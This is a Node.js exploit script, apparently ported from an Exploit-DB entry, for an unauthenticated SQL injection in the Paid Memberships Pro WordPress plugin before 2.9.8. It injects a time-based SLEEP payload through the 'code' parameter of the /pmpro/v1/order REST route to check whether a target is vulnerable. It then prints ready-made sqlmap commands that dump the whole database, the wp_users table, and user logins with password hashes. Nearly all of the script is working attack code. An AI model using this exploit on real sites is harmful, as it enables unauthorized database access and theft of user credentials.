// Reference : https://www.exploit-db.com/exploits/51235

const axios = require('axios');
const { performance } = require('perf_hooks');

async function getRequest(targetUrl, delay = '1') {
    const payload = `a' OR (SELECT 1 FROM (SELECT(SLEEP(${delay})))a)-- -`;
    const params = {
        rest_route: '/pmpro/v1/order',
        code: payload,
    };

    const startTime = performance.now();
    await axios.get(targetUrl, { params });
    const endTime = performance.now();

    return (endTime - startTime) / 1000; // Convert from ms to seconds
}

console.log('Paid Memberships Pro < 2.9.8 (WordPress Plugin) - Unauthenticated SQL Injection\n');
if (process.argv.length !== 3) {
    console.log(`Usage: node ${process.argv[1]} <target_url>`);
    console.log(`Example: node ${process.argv[1]} http://127.0.0.1/wordpress`);
    process.exit(1);
}

const targetUrl = process.argv[2];
axios.get(targetUrl, { timeout: 15000 }).then(async () => {
    console.log('[-] Testing if the target is vulnerable...');
    try {
        if (await getRequest(targetUrl, '1') >= await getRequest(targetUrl, '2')) {
            console.log('[!] The target does not seem vulnerable');
            process.exit(3);
        }

        console.log('\n[*] The target is vulnerable');
        console.log('\n[+] You can dump the whole WordPress database with:');
        console.log(`sqlmap -u "${targetUrl}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump`);
        console.log('\n[+] To dump data from specific tables:');
        console.log(`sqlmap -u "${targetUrl}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users`);
        console.log('\n[+] To dump only WordPress usernames and passwords columns (you should check if users table have the default name):');
        console.log(`sqlmap -u "${targetUrl}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass`);
        process.exit(0);
    } catch (error) {
        console.log('[!] ERROR: Target is unreachable');
        process.exit(2);
    }
}).catch((error) => {
    console.log('[!] ERROR: Target is unreachable');
    process.exit(2);
});
